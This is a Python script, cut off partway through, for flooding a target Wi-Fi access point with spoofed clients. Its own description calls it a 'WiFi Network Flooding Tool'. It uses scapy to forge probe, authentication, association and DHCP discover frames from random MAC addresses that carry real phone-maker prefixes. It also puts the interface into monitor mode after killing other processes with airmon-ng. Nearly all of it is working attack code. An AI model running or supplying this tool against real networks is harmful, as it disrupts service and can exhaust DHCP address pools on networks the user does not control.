#!/usr/bin/env python3
import subprocess
import time
import random
import sys
import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Auth, Dot11AssoReq
from concurrent.futures import ThreadPoolExecutor

# Common device name prefixes
DEVICE_PREFIXES = [
    "Samsung-", "Galaxy-", "Motorola-", "Moto-", "iPhone-", "iPad-", 
    "Xiaomi-", "Redmi-", "Huawei-", "Honor-", "OnePlus-", "OPPO-",
    "vivo-", "Realme-", "LG-", "Sony-", "Nokia-", "Google-",
    "Pixel-", "Surface-", "Kindle-", "Fire-", "Echo-", "Alexa-",
    "Roku-", "Chromecast-", "AppleTV-", "SmartTV-", "WebOS-"
]

# Common device suffixes
DEVICE_SUFFIXES = [
    "Pro", "Plus", "Max", "Ultra", "Lite", "Mini", "SE", "XL",
    "A1", "A2", "A3", "A5", "A7", "A9", "G5", "G7", "G8", "G9",
    "10", "11", "12", "13", "14", "15", "20", "30", "40", "50",
    "2020", "2021", "2022", "2023", "2024", "2025"
]

def generate_device_name():
    """Generate a realistic device name"""
    prefix = random.choice(DEVICE_PREFIXES)
    suffix = random.choice(DEVICE_SUFFIXES)
    number = random.randint(1, 99)
    return f"{prefix}{suffix}{number}"

def generate_random_mac():
    """Generate a random MAC address with appropriate OUI for mobile devices"""
    # Common OUIs for mobile device manufacturers
    mobile_ouis = [
        "00:16:32", "00:17:C2", "00:19:E7", "00:21:E9", "00:23:14",  # Samsung
        "00:1E:E2", "00:22:F7", "00:24:91", "00:26:08", "00:27:0E",  # Apple
        "34:CE:00", "64:20:9F", "78:11:DC", "A0:99:9B", "B4:CE:F6",  # Apple
        "28:E1:4C", "28:E1:4D", "28:E1:4E", "28:E1:4F", "28:E1:50",  # Apple
        "00:12:FB", "00:16:32", "00:17:C2", "00:19:E7", "00:21:E9",  # Samsung
        "F0:27:65", "F8:A9:63", "AC:5C:F4", "CC:3A:61", "D0:22:BE",  # Xiaomi
        "00:E0:4C", "08:96:D7", "28:6E:D4", "34:80:B3", "50:8F:4C",  # Huawei
        "B4:99:BA", "C8:3A:35", "D8:15:0D", "F8:E7:1E", "0C:8B:FD",  # Motorola
        "70:1A:04", "78:11:DC", "E8:50:8B", "F0:EE:10", "F8:C3:9A"   # OnePlus
    ]
    
    oui = random.choice(mobile_ouis)
    return "%s:%02x:%02x:%02x" % (
        oui,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def kill_conflicting_processes():
    """Kill processes that could interfere with monitor mode"""
    try:
        subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
        print("Conflicting processes killed")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Warning: Could not kill conflicting processes: {e}")
        return False

def simulate_connection_request(interface, ssid, ap_mac, device_id):
    """Simulate a device attempting to connect to the AP"""
    fake_mac = generate_random_mac()
    device_name = generate_device_name()
    
    print(f"Simulating connection request from device {device_id}: {device_name} ({fake_mac})")
    
    # Create and send probe request
    probe_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11ProbeReq()/Dot11Elt(ID='SSID', info=ssid)
    sendp(probe_req, iface=interface, verbose=0)
    time.sleep(random.uniform(0.1, 0.3))
    
    # Create and send authentication request
    auth_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11Auth(seqnum=1, algo=0)
    sendp(auth_req, iface=interface, verbose=0)
    time.sleep(random.uniform(0.1, 0.3))
    
    # Create and send association request with device info
    asso_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11AssoReq()/Dot11Elt(ID='SSID', info=ssid)/Dot11Elt(ID=221, info=device_name.encode())
    sendp(asso_req, iface=interface, verbose=0)
    
    # Send DHCP discover with hostname
    dhcp_discover = Ether(src=fake_mac, dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0', dst='255.255.255.255')/UDP(sport=68, dport=67)/BOOTP(chaddr=[int(x, 16) for x in fake_mac.split(':')])/DHCP(options=[('message-type', 'discover'), ('hostname', device_name), 'end'])
    sendp(dhcp_discover, iface=interface, verbose=0)
    
    return fake_mac, device_name

def get_ap_mac(interface, ssid):
    """Get the MAC address of the access point for the given SSID"""
    try:
        result = subprocess.run(['iwlist', interface, 'scan'], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        
        ap_mac = None
        current_ssid = None
        
        for line in lines:
            if 'Address:' in line:
                ap_mac = line.split('Address:')[1].strip()
            elif 'ESSID:' in line:
                current_ssid = line.split('ESSID:"')[1].split('"')[0]
                if current_ssid == ssid and ap_mac:
                    return ap_mac
        return None
    except:
        print("Could not determine AP MAC address, using broadcast")
        return 'ff:ff:ff:ff:ff:ff'

def simulate_connection_requests(interface, ssid, num_devices=20, max_workers=5, delay=0.5):
    """Simulate multiple devices requesting connection to the AP"""
    print(f"Simulating {num_devices} devices requesting access to {ssid}...")
    
    # Get the AP MAC address
    ap_mac = get_ap_mac(interface, ssid)
    if not ap_mac:
        ap_mac = 'ff:ff:ff:ff:ff:ff'
        print("Could not determine AP MAC, using broadcast address")
    else:
        print(f"Target AP MAC: {ap_mac}")
    
    # Kill conflicting processes
    kill_conflicting_processes()
    
    # Set interface in monitor mode
    try:
        subprocess.run(['airmon-ng', 'start', interface], check=True)
        mon_interface = interface + 'mon'
        print(f"Monitor mode enabled on {mon_interface}")
    except:
        # Fallback if airmon-ng is not available
        mon_interface = interface
        print("Continuing without explicit monitor mode setup")
    
    # Create devices in batches
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for i in range(num_devices):
            futures.append(executor.submit(simulate_connection_request, mon_interface, ssid, ap_mac, i+1))
            # Add a small delay between starting each thread to avoid overwhelming the network
            time.sleep(delay)
        
        # Wait for all devices to be created
        for future in futures:
            future.result()
    
    # Stop monitor mode if we started it
    try:
        subprocess.run(['airmon-ng', 'stop', mon_interface], check=True)
    except:
        pass
    
    print("Fake device simulation complete")

def main():
    parser = argparse.ArgumentParser(description='WiFi Network Flooding Tool (No Connection)')
    parser
